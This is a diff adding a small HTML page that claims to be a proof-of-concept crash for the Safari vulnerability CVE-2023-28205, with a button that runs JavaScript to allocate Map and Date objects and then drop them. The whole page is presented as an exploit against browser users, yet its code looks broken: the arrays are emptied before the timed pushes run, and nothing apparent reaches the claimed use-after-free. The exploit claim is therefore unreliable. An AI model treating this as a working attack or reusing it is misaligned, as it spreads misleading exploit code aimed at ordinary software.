@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>CVE-2023-28205 PoC Crash</title>
+</head>
+<body>
+  <h1>Trigger CVE-2023-28205 Safari Crash</h1>
+  <button id="start">Start Crash</button>
+  <script>
+    const mapArray = [];
+    const dateArray = [];
+
+    function triggerUAF() {
+      for (let i = 0; i < 10000; i++) {
+        const m = new Map();
+        const d = new Date();
+
+        if (i % 2 === 0) {
+          setTimeout(() => {
+            mapArray.push(m);
+          }, 1000);
+        } else {
+          setTimeout(() => {
+            dateArray.push(d);
+          }, 1000);
+        }
+      }
+
+      setTimeout(() => {
+        mapArray.length = 0;
+        dateArray.length = 0;
+        console.log("References dropped, triggering GC...");
+      }, 500);
+    }
+
+    document.getElementById('start').addEventListener('click', () => {
+      triggerUAF();
+    });
+  </script>
+</body>
+</html>
